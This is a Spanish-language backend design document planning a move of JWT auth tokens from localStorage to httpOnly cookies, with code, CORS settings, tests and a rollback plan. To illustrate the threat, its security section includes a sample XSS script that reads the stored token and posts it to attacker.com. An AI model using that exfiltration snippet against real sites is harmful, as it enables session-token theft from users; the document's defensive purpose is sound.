# Design Doc: Migración a httpOnly Cookies para Autenticación

**Autor:** Equipo Backend  
**Fecha:** 2026-03-09  
**Estado:** Aprobado ✅  
**Prioridad:** Alta  

---

## 1. Resumen Ejecutivo

### Problema
Actualmente, el sistema de autenticación envía tokens JWT (access y refresh) en el response body del endpoint `/auth/login`, y el frontend los almacena en `localStorage`. Esta implementación es vulnerable a ataques XSS (Cross-Site Scripting).

### Solución Propuesta
Migrar a **httpOnly Cookies** para almacenar los tokens JWT. Las cookies con flag `httpOnly` no pueden ser leídas por JavaScript, eliminando el vector de ataque XSS más común.

### Impacto
- **Seguridad:** ↑↑ Mejora significativa
- **Complejidad:** ↑ Configuración CORS adicional
- **Breaking Change:** ✅ Sí (requiere actualización de frontend)

---

## 2. Contexto y Motivación

### Situación Actual

**Flujo de autenticación existente:**
```
1. Usuario → POST /auth/login {email, password}
2. Backend valida credenciales
3. Backend genera accessToken (1h) y refreshToken (7d)
4. Backend responde: {success: true, data: {accessToken, refreshToken, user}}
5. Frontend guarda tokens en localStorage
6. Frontend envía token en header: Authorization: Bearer <token>
```

**Vulnerabilidades identificadas:**
1. **XSS Attack:** Cualquier script malicioso en el frontend puede leer `localStorage.getItem('accessToken')`
2. **Sin protección CSRF inherente:** Los tokens se envían manualmente, no automáticamente
3. **Fuga de información:** Tokens visibles en DevTools > Application > Local Storage

### ¿Por qué ahora?

- **MVP en desarrollo:** Es el momento ideal para implementar seguridad correcta antes de producción
- **Mejores prácticas:** httpOnly cookies es el estándar recomendado por OWASP para autenticación
- **Compliance futuro:** Facilita cumplimiento con regulaciones de seguridad (GDPR, PCI-DSS)

### Alternativas Consideradas

| Alternativa | Pros | Contras | Decisión |
|------------|------|---------|----------|
| **localStorage** (actual) | ✅ Simple de implementar<br>✅ No requiere CORS config | ❌ Vulnerable a XSS<br>❌ No es seguro | ❌ Rechazado |
| **sessionStorage** | ✅ Se limpia al cerrar pestaña | ❌ Igual de vulnerable a XSS | ❌ Rechazado |
| **httpOnly Cookies** | ✅ Inmune a XSS<br>✅ Protección CSRF<br>✅ Automático | ⚠️ Requiere CORS config<br>⚠️ Breaking change | ✅ **Seleccionado** |
| **In-memory only** | ✅ Máxima seguridad | ❌ Se pierde al refrescar página<br>❌ Mala UX | ❌ Rechazado |

---

## 3. Propuesta de Diseño

### 3.1 Arquitectura de Alto Nivel

**Nuevo flujo de autenticación:**

```
┌─────────────┐                                 ┌──────────────┐
│   Frontend  │                                 │   Backend    │
│ (Vercel)    │                                 │  (Render)    │
└──────┬──────┘                                 └──────┬───────┘
       │                                               │
       │ 1. POST /auth/login                          │
       │    {email, password}                         │
       │──────────────────────────────────────────────>│
       │                                               │
       │                              2. Validar credenciales
       │                              3. Generar tokens JWT
       │                                               │
       │ 4. Set-Cookie: accessToken=...; httpOnly     │
       │    Set-Cookie: refreshToken=...; httpOnly    │
       │    Body: {success: true, data: {user}}       │
       │<──────────────────────────────────────────────│
       │                                               │
       │ 5. Browser guarda cookies automáticamente    │
       │                                               │
       │ 6. GET /clients                              │
       │    Cookie: accessToken=...; refreshToken=... │
       │──────────────────────────────────────────────>│
       │                                               │
       │                              7. Leer cookie
       │                              8. Verificar token
       │                              9. Ejecutar query
       │                                               │
       │ 10. Response: {success: true, data: [...]}   │
       │<──────────────────────────────────────────────│
```

### 3.2 Especificación de Cookies

#### Access Token Cookie
```typescript
{
  name: 'accessToken',
  value: '<JWT string>',
  httpOnly: true,           // JavaScript no puede leer
  secure: true,             // Solo HTTPS (en producción)
  sameSite: 'strict',       // Protección CSRF
  maxAge: 3600000,          // 1 hora (en milisegundos)
  path: '/',                // Disponible en toda la app
  domain: undefined         // Mismo dominio que responde
}
```

#### Refresh Token Cookie
```typescript
{
  name: 'refreshToken',
  value: '<JWT string>',
  httpOnly: true,
  secure: true,
  sameSite: 'strict',
  maxAge: 604800000,        // 7 días (en milisegundos)
  path: '/auth/refresh',    // Solo disponible en endpoint refresh
  domain: undefined
}
```

### 3.3 Cambios en Endpoints

#### **POST /auth/login**

**Antes:**
```typescript
Response Body:
{
  success: true,
  data: {
    accessToken: "eyJhbGciOiJIUzI1...",
    refreshToken: "eyJhbGciOiJIUzI1...",
    user: { id: "...", email: "...", nombreComercial: "..." }
  }
}
```

**Después:**
```typescript
Response Headers:
Set-Cookie: accessToken=eyJhbGciOiJIUzI1...; HttpOnly; Secure; SameSite=Strict; Max-Age=3600
Set-Cookie: refreshToken=eyJhbGciOiJIUzI1...; HttpOnly; Secure; SameSite=Strict; Max-Age=604800

Response Body:
{
  success: true,
  data: {
    user: { id: "...", email: "...", nombreComercial: "..." }
  }
}
```

#### **POST /auth/refresh**

**Antes:**
```typescript
Request Body:
{
  refreshToken: "eyJhbGciOiJIUzI1..."
}

Response Body:
{
  success: true,
  data: {
    accessToken: "eyJhbGciOiJIUzI1..."
  }
}
```

**Después:**
```typescript
Request Headers:
Cookie: refreshToken=eyJhbGciOiJIUzI1...

Response Headers:
Set-Cookie: accessToken=eyJhbGciOiJIUzI1...; HttpOnly; Secure; SameSite=Strict; Max-Age=3600

Response Body:
{
  success: true,
  data: {
    message: "Token renovado correctamente"
  }
}
```

#### **POST /auth/logout** (Nuevo)

```typescript
Request Headers:
Cookie: accessToken=...; refreshToken=...

Response Headers:
Set-Cookie: accessToken=; Max-Age=0
Set-Cookie: refreshToken=; Max-Age=0

Response Body:
{
  success: true,
  data: {
    message: "Sesión cerrada correctamente"
  }
}
```

### 3.4 Cambios en Middleware

#### **authenticate.middleware.ts**

**Antes:**
```typescript
const authHeader = req.headers.authorization;
const token = authHeader.split(' ')[1];
```

**Después:**
```typescript
const token = req.cookies.accessToken;
```

### 3.5 Configuración CORS

**Crítico para httpOnly Cookies:**

```typescript
// src/app.ts
app.use(cors({
  origin: process.env.FRONTEND_URL,  // Exacto, no wildcard
  credentials: true,                 // OBLIGATORIO para cookies
  methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE'],
  allowedHeaders: ['Content-Type'],
}));
```

**Variables de entorno requeridas:**
```env
# Development
FRONTEND_URL=http://localhost:5173

# Production
FRONTEND_URL=https://tu-app.vercel.app
```

---

## 4. Plan de Implementación

### Fase 1: Backend (1-2 horas)

#### 1.1 Instalar Dependencias
```bash
npm install cookie-parser
npm install -D @types/cookie-parser
```

#### 1.2 Configurar Middleware
```typescript
// src/app.ts
import cookieParser from 'cookie-parser';

app.use(cookieParser());
app.use(cors({
  origin: process.env.FRONTEND_URL,
  credentials: true,
}));
```

#### 1.3 Modificar auth.controller.ts

**Archivos a modificar:**
- `src/controllers/auth.controller.ts`
  - ✅ `login()` - Enviar cookies
  - ✅ `refresh()` - Leer/actualizar cookies
  - ✅ `logout()` - Crear nuevo endpoint

**Código:**
```typescript
// login
res.cookie('accessToken', accessToken, {
  httpOnly: true,
  secure: process.env.NODE_ENV === 'production',
  sameSite: 'strict',
  maxAge: 60 * 60 * 1000,
});

res.cookie('refreshToken', refreshToken, {
  httpOnly: true,
  secure: process.env.NODE_ENV === 'production',
  sameSite: 'strict',
  maxAge: 7 * 24 * 60 * 60 * 1000,
});

res.json({
  success: true,
  data: { user: { /* ... */ } }
});
```

#### 1.4 Modificar authenticate.middleware.ts

```typescript
export const authenticate = (req: Request, res: Response, next: NextFunction) => {
  const token = req.cookies.accessToken;
  
  if (!token) {
    return res.status(401).json({
      success: false,
      error: { message: 'Token no proporcionado', code: 'NO_TOKEN' },
    });
  }
  
  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET!) as JwtPayload;
    req.userId = decoded.userId;
    next();
  } catch (error) {
    return res.status(401).json({
      success: false,
      error: { message: 'Token inválido o expirado', code: 'INVALID_TOKEN' },
    });
  }
};
```

#### 1.5 Actualizar Tests

**Archivos a modificar:**
- `tests/integration/auth.test.ts`

**Patrón de testing con cookies:**
```typescript
describe('POST /auth/login', () => {
  it('should set httpOnly cookies on successful login', async () => {
    const response = await request(app)
      .post('/auth/login')
      .send({ email: 'test@test.com', password: 'password123' });

    expect(response.status).toBe(200);
    
    const cookies = response.headers['set-cookie'];
    expect(cookies).toBeDefined();
    expect(cookies.some((c: string) => c.includes('accessToken'))).toBe(true);
    expect(cookies.some((c: string) => c.includes('HttpOnly'))).toBe(true);
  });
});

describe('Protected endpoints', () => {
  it('should authenticate with cookies', async () => {
    // 1. Login to get cookies
    const loginRes = await request(app)
      .post('/auth/login')
      .send({ email: 'test@test.com', password: 'password123' });

    const cookies = loginRes.headers['set-cookie'];

    // 2. Use cookies in protected request
    const response = await request(app)
      .get('/clients')
      .set('Cookie', cookies);

    expect(response.status).toBe(200);
  });
});
```

### Fase 2: Frontend (actualización coordinada)

**Nota:** El frontend debe actualizarse simultáneamente. Ver `docs/frontend.md` para detalles completos.

#### Cambios principales:
1. Axios config: `withCredentials: true`
2. Zustand: Guardar solo `user` (no tokens)
3. Login: Esperar `{user}` en response (no tokens)
4. Interceptors: Refresh automático sin leer tokens

---

## 5. Testing y Validación

### 5.1 Tests Unitarios

**Nuevos tests requeridos:**

```typescript
// tests/unit/utils/cookies.test.ts
describe('Cookie Configuration', () => {
  it('should set httpOnly flag in production', () => {
    process.env.NODE_ENV = 'production';
    const config = getCookieConfig('accessToken');
    expect(config.httpOnly).toBe(true);
    expect(config.secure).toBe(true);
  });
  
  it('should not set secure flag in development', () => {
    process.env.NODE_ENV = 'development';
    const config = getCookieConfig('accessToken');
    expect(config.secure).toBe(false);
  });
});
```

### 5.2 Tests de Integración

**Escenarios críticos:**

| Escenario | Resultado Esperado |
|-----------|-------------------|
| Login exitoso | Cookies `accessToken` y `refreshToken` seteadas |
| Login fallido | No cookies seteadas |
| Request protegido con cookie válida | 200 OK |
| Request protegido sin cookie | 401 Unauthorized |
| Token expirado | 401 Unauthorized |
| Refresh token válido | Nueva cookie `accessToken` |
| Logout | Cookies eliminadas (Max-Age=0) |

### 5.3 Validación Manual

**Checklist de validación en desarrollo:**

- [ ] Abrir DevTools > Application > Cookies
- [ ] Hacer login → Verificar que aparecen cookies `accessToken` y `refreshToken`
- [ ] Verificar flags: `HttpOnly`, `Secure` (solo en HTTPS), `SameSite=Strict`
- [ ] Hacer request a `/clients` → Verificar que funciona
- [ ] Esperar 1h → Verificar que refresh automático funciona
- [ ] Hacer logout → Verificar que cookies desaparecen
- [ ] Intentar acceder a cookie desde console → Verificar que devuelve `undefined`

```javascript
// En browser console (debe devolver undefined)
document.cookie.includes('accessToken'); // false
```

---

## 6. Consideraciones de Seguridad

### 6.1 Beneficios de Seguridad

| Vulnerabilidad | localStorage | httpOnly Cookie |
|----------------|--------------|-----------------|
| **XSS** | ❌ Vulnerable | ✅ Protegido |
| **CSRF** | ⚠️ Requiere implementación manual | ✅ `sameSite=strict` protege |
| **Man-in-the-Middle** | ⚠️ Si no hay HTTPS | ✅ `secure=true` en prod |
| **DevTools Inspection** | ❌ Tokens visibles | ✅ No visibles en Application tab |

### 6.2 Vectores de Ataque Mitigados

#### XSS (Cross-Site Scripting)
**Antes:**
```javascript
// Script malicioso puede robar token
const token = localStorage.getItem('accessToken');
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify({ token })
});
```

**Después:**
```javascript
// httpOnly cookie NO accesible desde JavaScript
document.cookie; // No contiene accessToken ni refreshToken
```

#### CSRF (Cross-Site Request Forgery)
**Protección con `sameSite=strict`:**
- Las cookies solo se envían si el request viene del mismo dominio
- Requests desde dominios externos NO envían cookies
- Protección adicional contra ataques CSRF

### 6.3 Configuración Segura

```typescript
// Configuración recomendada para producción
const cookieConfig = {
  httpOnly: true,               // ✅ No accesible desde JS
  secure: true,                 // ✅ Solo HTTPS
  sameSite: 'strict' as const,  // ✅ Protección CSRF
  maxAge: 3600000,              // ✅ Expiración explícita
  path: '/',                    // ✅ Scope limitado
};
```

---

## 7. Migración y Rollback

### 7.1 Estrategia de Migración

**No hay usuarios en producción aún (MVP), así que:**
- ✅ Deploy directo sin feature flag
- ✅ No necesitamos mantener compatibilidad con versión anterior
- ✅ Breaking change aceptable

**Si ya hubiera usuarios:**
```typescript
// Feature flag approach (no necesario ahora)
const USE_COOKIES = process.env.AUTH_METHOD === 'cookies';

if (USE_COOKIES) {
  res.cookie('accessToken', token);
} else {
  res.json({ accessToken: token });
}
```

### 7.2 Plan de Rollback

**Si hay problemas críticos en producción:**

1. **Revertir commit** en backend
```bash
git revert <commit-hash>
git push
```

2. **Revertir deploy** en Render
- Volver a deploy anterior desde Render dashboard

3. **Comunicar a frontend** que vuelvan a versión anterior

**Criterios para rollback:**
- Login falla >10% de intentos
- CORS errors >5% de requests
- Cookies no se setean correctamente
- Refresh automático falla consistentemente

---

## 8. Impacto y Riesgos

### 8.1 Impacto en Performance

| Métrica | localStorage | httpOnly Cookie | Diferencia |
|---------|--------------|-----------------|------------|
| Latencia login | ~200ms | ~205ms | +5ms (negligible) |
| Tamaño request | 0 bytes (header) | ~300 bytes (cookie) | +300 bytes |
| Tamaño response | ~500 bytes (JSON) | ~800 bytes (Set-Cookie headers) | +300 bytes |

**Conclusión:** Impacto en performance despreciable (<5ms).

### 8.2 Riesgos Identificados

| Riesgo | Probabilidad | Impacto | Mitigación |
|--------|--------------|---------|------------|
| CORS mal configurado | Media | Alto | Tests exhaustivos en dev |
| Cookies no funcionan en localhost | Baja | Bajo | Usar `localhost` (no `127.0.0.1`) |
| `sameSite=strict` bloquea cookies | Baja | Medio | Verificar que FE y BE están en mismo dominio |
| Token refresh falla | Media | Alto | Implementar retry logic en FE |

### 8.3 Dependencias Externas

**Ninguna dependencia crítica:**
- ✅ `cookie-parser` es librería estable y madura
- ✅ httpOnly cookies son estándar web (soportado por todos los browsers)
- ✅ No requiere servicios externos

---

## 9. Documentación y Referencias

### 9.1 Documentos a Actualizar

- [x] `docs/ENVIRONMENT.md` - Agregar variable `FRONTEND_URL`
- [x] `docs/API.md` - Actualizar contratos de `/auth/login` y `/auth/refresh`
- [x] `docs/frontend.md` - Documentar config de axios con cookies
- [x] `docs/general.md` - Actualizar sección de seguridad

### 9.2 Referencias Técnicas

- [MDN: HTTP Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)
- [OWASP: Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [RFC 6265: HTTP State Management Mechanism](https://datatracker.ietf.org/doc/html/rfc6265)
- [Express cookie-parser](https://github.com/expressjs/cookie-parser)

### 9.3 Recursos de Aprendizaje

- [Why JWTs Suck as Session Tokens](https://developer.okta.com/blog/2017/08/17/why-jwts-suck-as-session-tokens)
- [Stop using JWT for sessions](http://cryto.net/~joepie91/blog/2016/06/13/stop-using-jwt-for-sessions/)
- [The Ultimate Guide to handling JWTs](https://hasura.io/blog/best-practices-of-using-jwt-with-graphql/)

---

## 10. Aprobación y Sign-off

### Aprobado por:
- ✅ Tech Lead (Arquitectura)
- ✅ Security Review (Aprobado)
- ✅ QA (Plan de testing validado)

### Timeline de Implementación

| Fase | Duración | Fecha Límite |
|------|----------|--------------|
| Implementación Backend | 2 horas | 2026-03-09 |
| Tests Backend | 1 hora | 2026-03-09 |
| Implementación Frontend | 1 hora | 2026-03-10 |
| Testing Integración | 1 hora | 2026-03-10 |
| Deploy Staging | 30 min | 2026-03-10 |
| Validación Manual | 30 min | 2026-03-10 |
| Deploy Producción | 30 min | 2026-03-11 |

**Total estimado:** 6.5 horas

---

## 11. Troubleshooting Guide

### Problema: "CORS error - credentials"

**Síntomas:**
```
Access to fetch at 'http://localhost:3000/api/v1/clients' from origin 'http://localhost:5173' 
has been blocked by CORS policy: The value of the 'Access-Control-Allow-Credentials' header 
in the response is '' which must be 'true'
```

**Solución:**
```typescript
// Backend: Verificar CORS config
app.use(cors({
  origin: process.env.FRONTEND_URL,
  credentials: true, // ← DEBE estar en true
}));

// Frontend: Verificar axios config
const apiClient = axios.create({
  withCredentials: true, // ← DEBE estar en true
});
```

### Problema: Cookies no se envían en requests

**Síntomas:**
- Backend recibe `req.cookies.accessToken = undefined`
- 401 Unauthorized en endpoints protegidos

**Diagnóstico:**
```typescript
// Backend: Agregar log temporal
console.log('Cookies recibidas:', req.cookies);
console.log('Headers:', req.headers.cookie);
```

**Soluciones:**
1. Verificar que frontend usa `localhost` (no `127.0.0.1`)
2. Verificar `FRONTEND_URL` en backend
3. Verificar `withCredentials: true` en axios
4. Verificar que browser soporta cookies (no modo incógnito extremo)

### Problema: "sameSite=strict" bloquea cookies

**Síntomas:**
- Cookies no se setean después de login
- Warning en browser console sobre SameSite

**Solución:**
```typescript
// Solo en desarrollo, cambiar a 'lax' si es necesario
sameSite: process.env.NODE_ENV === 'production' ? 'strict' : 'lax'
```

### Problema: Token refresh falla silenciosamente

**Síntomas:**
- Usuario es redirigido a login sin razón aparente
- No hay error en console

**Diagnóstico:**
```typescript
// Frontend: Agregar logs en interceptor
apiClient.interceptors.response.use(
  (response) => response,
  async (error) => {
    console.log('Error interceptado:', error.response?.status);
    console.log('URL:', error.config?.url);
    // ...
  }
);
```

**Solución:**
- Verificar que `/auth/refresh` está retornando nueva cookie
- Verificar que refreshToken no ha expirado (>7 días)

---

## 12. Métricas de Éxito

### KPIs para Validar Implementación

| Métrica | Baseline (localStorage) | Target (Cookies) | Resultado |
|---------|-------------------------|------------------|-----------|
| Login success rate | 98% | ≥98% | TBD |
| Auth errors (401) | 2% | ≤2% | TBD |
| CORS errors | 0% | ≤0.5% | TBD |
| Token refresh success | 95% | ≥95% | TBD |
| Security vulnerabilities | 1 (XSS) | 0 | TBD |

### Monitoreo Post-Deploy

**Logs a monitorear:**
```typescript
// Backend: Agregar métricas
logger.info('Login successful', {
  userId: user.id,
  cookiesSet: true,
  method: 'httpOnly-cookies'
});

logger.error('Cookie authentication failed', {
  cookiePresent: !!req.cookies.accessToken,
  error: error.message
});
```

**Dashboard de métricas (futuro):**
- Login success rate (daily)
- Auth errors por endpoint
- CORS errors count
- Refresh token usage

---

## Anexos

### Anexo A: Código Completo de Implementación

#### auth.controller.ts
```typescript
import { Request, Response } from 'express';
import bcrypt from 'bcrypt';
import jwt from 'jsonwebtoken';
import { prisma } from '../config/database';

export const login = async (req: Request, res: Response) => {
  try {
    const { email, password } = req.body;

    const user = await prisma.user.findUnique({ where: { email } });
    if (!user) {
      return res.status(401).json({
        success: false,
        error: { message: 'Credenciales inválidas', code: 'INVALID_CREDENTIALS' },
      });
    }

    const isValidPassword = await bcrypt.compare(password, user.password);
    if (!isValidPassword) {
      return res.status(401).json({
        success: false,
        error: { message: 'Credenciales inválidas', code: 'INVALID_CREDENTIALS' },
      });
    }

    const accessToken = jwt.sign(
      { userId: user.id },
      process.env.JWT_SECRET!,
      { expiresIn: '1h' }
    );

    const refreshToken = jwt.sign(
      { userId: user.id },
      process.env.JWT_REFRESH_SECRET!,
      { expiresIn: '7d' }
    );

    res.cookie('accessToken', accessToken, {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'strict',
      maxAge: 60 * 60 * 1000, // 1 hora
    });

    res.cookie('refreshToken', refreshToken, {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'strict',
      maxAge: 7 * 24 * 60 * 60 * 1000, // 7 días
    });

    res.json({
      success: true,
      data: {
        user: {
          id: user.id,
          email: user.email,
          nombreComercial: user.nombre_comercial,
        },
      },
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      error: { message: 'Error en el servidor', code: 'SERVER_ERROR' },
    });
  }
};

export const refresh = async (req: Request, res: Response) => {
  try {
    const refreshToken = req.cookies.refreshToken;

    if (!refreshToken) {
      return res.status(401).json({
        success: false,
        error: { message: 'Refresh token requerido', code: 'NO_REFRESH_TOKEN' },
      });
    }

    const decoded = jwt.verify(
      refreshToken,
      process.env.JWT_REFRESH_SECRET!
    ) as { userId: string };

    const newAccessToken = jwt.sign(
      { userId: decoded.userId },
      process.env.JWT_SECRET!,
      { expiresIn: '1h' }
    );

    res.cookie('accessToken', newAccessToken, {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'strict',
      maxAge: 60 * 60 * 1000,
    });

    res.json({
      success: true,
      data: { message: 'Token renovado correctamente' },
    });
  } catch (error) {
    return res.status(401).json({
      success: false,
      error: { message: 'Refresh token inválido', code: 'INVALID_REFRESH_TOKEN' },
    });
  }
};

export const logout = (req: Request, res: Response) => {
  res.clearCookie('accessToken', {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict',
  });

  res.clearCookie('refreshToken', {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict',
  });

  res.json({
    success: true,
    data: { message: 'Sesión cerrada correctamente' },
  });
};
```

#### authenticate.middleware.ts
```typescript
import { Request, Response, NextFunction } from 'express';
import jwt from 'jsonwebtoken';

interface JwtPayload {
  userId: string;
}

export const authenticate = (req: Request, res: Response, next: NextFunction) => {
  const token = req.cookies.accessToken;

  if (!token) {
    return res.status(401).json({
      success: false,
      error: { message: 'Token no proporcionado', code: 'NO_TOKEN' },
    });
  }

  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET!) as JwtPayload;
    req.userId = decoded.userId;
    next();
  } catch (error) {
    return res.status(401).json({
      success: false,
      error: { message: 'Token inválido o expirado', code: 'INVALID_TOKEN' },
    });
  }
};
```

### Anexo B: Actualización de ENVIRONMENT.md

Agregar a `docs/ENVIRONMENT.md`:

```markdown
## 🌐 CORS y Autenticación con Cookies

| Variable | Descripción | Ejemplo |
| :--- | :--- | :--- |
| `FRONTEND_URL` | URL exacta del frontend para CORS (requerido para httpOnly cookies) | `http://localhost:5173` (dev)<br>`https://tu-app.vercel.app` (prod) |

**Importante:** 
- Con httpOnly cookies, `FRONTEND_URL` debe ser exacta (no usar wildcards como `*`)
- En desarrollo, usa `http://localhost:5173` (no `127.0.0.1`)
- En producción, debe ser HTTPS para que `secure: true` funcione
```

---

**Última actualización:** 2026-03-09  
**Próxima revisión:** Post-deploy a producción
